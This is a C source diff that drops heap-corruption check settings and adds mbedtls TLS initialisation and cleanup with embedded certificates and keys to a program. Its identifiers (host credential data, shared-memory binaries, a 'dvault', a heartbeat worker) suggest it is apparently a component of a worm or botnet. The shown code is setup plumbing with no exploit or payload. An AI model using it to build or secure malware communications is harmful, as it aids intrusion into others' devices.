@@ -10,7 +10,6 @@
 #include <errno.h>
 #include <fcntl.h>
 #include <signal.h>
-#include <malloc.h>
 #include <sys/stat.h>
 #include <sys/ioctl.h>
 #include <sys/mman.h>
@@ -22,6 +21,7 @@
 #include "util_rt.h"
 #include "dvault.h"
 #include "heartbeat-worker.h"
+#include "proone_conf/x509.h"
 
 
 struct prne_global prne_g;
@@ -354,13 +354,7 @@ END:
 }
 
 static void set_env (void) {
-#ifdef PRNE_DEBUG
-    // print info on heap corruption as much as possible
-    mallopt(M_CHECK_ACTION, 3);
-#else
-    // silently die on heap corruption
-    mallopt(M_CHECK_ACTION, 2);
-#endif
+    // environment set up function calls in here
 }
 
 static void create_ny_bin_shm (prne_rnd_engine_t *rnd) {
@@ -464,6 +458,32 @@ static void exec_ny_bin (void) {
     }
 }
 
+static void init_ssl (void) {
+    if (mbedtls_x509_crt_parse(&prne_g.ca, (const uint8_t*)PRNE_X509_CA_CRT, sizeof(PRNE_X509_CA_CRT) - 1) != 0) {
+        return;
+    }
+
+    prne_g.s_ssl_ready =
+        mbedtls_ssl_config_defaults(&prne_g.s_ssl.conf, MBEDTLS_SSL_IS_SERVER, MBEDTLS_SSL_TRANSPORT_STREAM, MBEDTLS_SSL_PRESET_DEFAULT) == 0 &&
+        mbedtls_x509_crt_parse(&prne_g.s_ssl.crt, (const uint8_t*)PRNE_X509_S_CRT, sizeof(PRNE_X509_S_CRT) - 1) == 0 &&
+        mbedtls_pk_parse_key(&prne_g.s_ssl.pk, (const uint8_t*)PRNE_X509_S_KEY, sizeof(PRNE_X509_S_KEY) - 1, NULL, 0) == 0 &&
+        mbedtls_dhm_parse_dhm(&prne_g.s_ssl.dhm, (const uint8_t*)PRNE_X509_DH, sizeof(PRNE_X509_DH) - 1) == 0 &&
+        mbedtls_ssl_conf_own_cert(&prne_g.s_ssl.conf, &prne_g.s_ssl.crt, &prne_g.s_ssl.pk) == 0 &&
+        mbedtls_ssl_conf_dh_param_ctx(&prne_g.s_ssl.conf, &prne_g.s_ssl.dhm) == 0;
+    if (prne_g.s_ssl_ready) {
+        mbedtls_ssl_conf_ca_chain(&prne_g.s_ssl.conf, &prne_g.ca, NULL);
+    }
+
+    prne_g.c_ssl_ready =
+        mbedtls_ssl_config_defaults(&prne_g.c_ssl.conf, MBEDTLS_SSL_IS_SERVER, MBEDTLS_SSL_TRANSPORT_STREAM, MBEDTLS_SSL_PRESET_DEFAULT) == 0 &&
+        mbedtls_x509_crt_parse(&prne_g.c_ssl.crt, (const uint8_t*)PRNE_X509_C_CRT, sizeof(PRNE_X509_C_CRT) - 1) == 0 &&
+        mbedtls_pk_parse_key(&prne_g.c_ssl.pk, (const uint8_t*)PRNE_X509_C_KEY, sizeof(PRNE_X509_C_KEY) - 1, NULL, 0) == 0 &&
+        mbedtls_ssl_conf_own_cert(&prne_g.c_ssl.conf, &prne_g.c_ssl.crt, &prne_g.c_ssl.pk) == 0;
+    if (prne_g.c_ssl_ready) {
+        mbedtls_ssl_conf_ca_chain(&prne_g.c_ssl.conf, &prne_g.ca, NULL);
+    }
+}
+
 static void init_shared_global (prne_rnd_engine_t *rnd) {
     // just die on error
     const size_t str_len = 1 + 10;
@@ -501,10 +521,6 @@ int main (const int argc, char **args) {
     int exit_code = 0;
     prne_rnd_engine_t *rnd = NULL;
 
-    // inits that need no outside resources
-    set_env();
-    prne_init_dvault();
-
     prne_g.host_cred_data = NULL;
     prne_g.host_cred_size = 0;
     prne_g.ny_bin_shm_name = NULL;
@@ -519,6 +535,21 @@ int main (const int argc, char **args) {
     prne_g.bin_ready = false;
     prne_init_unpack_bin_archive_result(&prne_g.bin_pack);
     prne_init_bin_archive(&prne_g.bin_archive);
+    mbedtls_x509_crt_init(&prne_g.ca);
+    mbedtls_ssl_config_init(&prne_g.s_ssl.conf);
+    mbedtls_x509_crt_init(&prne_g.s_ssl.crt);
+    mbedtls_pk_init(&prne_g.s_ssl.pk);
+    mbedtls_dhm_init(&prne_g.s_ssl.dhm);
+    prne_g.s_ssl_ready = false;
+    mbedtls_ssl_config_init(&prne_g.c_ssl.conf);
+    mbedtls_x509_crt_init(&prne_g.c_ssl.crt);
+    mbedtls_pk_init(&prne_g.c_ssl.pk);
+    prne_g.c_ssl_ready = false;
+
+    // inits that need no outside resources
+    prne_init_dvault();
+    init_ssl();
+    set_env();
 
     /* inits that need outside resources. IN THIS ORDER! */
     if (!ensure_single_instance()) {
@@ -594,6 +625,17 @@ END:
     prne_free_bin_archive(&prne_g.bin_archive);
     prne_free_unpack_bin_archive_result(&prne_g.bin_pack);
     prne_g.bin_ready = false;
+    
+    mbedtls_ssl_config_free(&prne_g.s_ssl.conf);
+    mbedtls_x509_crt_free(&prne_g.s_ssl.crt);
+    mbedtls_pk_free(&prne_g.s_ssl.pk);
+    mbedtls_dhm_free(&prne_g.s_ssl.dhm);
+    prne_g.s_ssl_ready = false;
+    mbedtls_ssl_config_free(&prne_g.c_ssl.conf);
+    mbedtls_x509_crt_free(&prne_g.c_ssl.crt);
+    mbedtls_pk_free(&prne_g.c_ssl.pk);
+    prne_g.c_ssl_ready = false;
+    mbedtls_x509_crt_free(&prne_g.ca);
 
     prne_free(prne_g.host_cred_data);
     prne_g.host_cred_data = NULL;
